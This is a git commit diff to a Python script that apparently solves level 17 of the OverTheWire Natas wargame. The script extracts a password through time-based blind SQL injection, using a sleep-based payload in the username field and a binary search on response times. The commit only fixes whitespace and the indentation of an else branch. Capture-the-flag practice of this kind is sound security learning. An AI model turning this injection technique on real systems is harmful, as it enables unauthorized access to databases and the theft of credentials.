bc23b42d801b3dc796e0df9f83ccc9a961e7e5e8
dotiendat97 <38005847+dotiendat97@users.noreply.github.com>
2018-09-04 11:42:01 +0700

    Update natas17.py

--- natas17.py
+++ natas17.py
@@ -22,7 +22,7 @@ for i in range(1,33):
 				passwd += chr(mid)
 				print "Password: " + passwd
 				break
-		Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(1),sleep(0))	-- -'}
+		Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(1),sleep(0))-- -'}
 		t = time.time()
 		r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
 		t = time.time() - t
@@ -32,8 +32,8 @@ for i in range(1,33):
 			t = time.time() - t
 			if t > 1:
 				st = mid + 1
-			else:
-				en = mid - 1
+		else:
+			en = mid - 1
 		
 				
 #check password
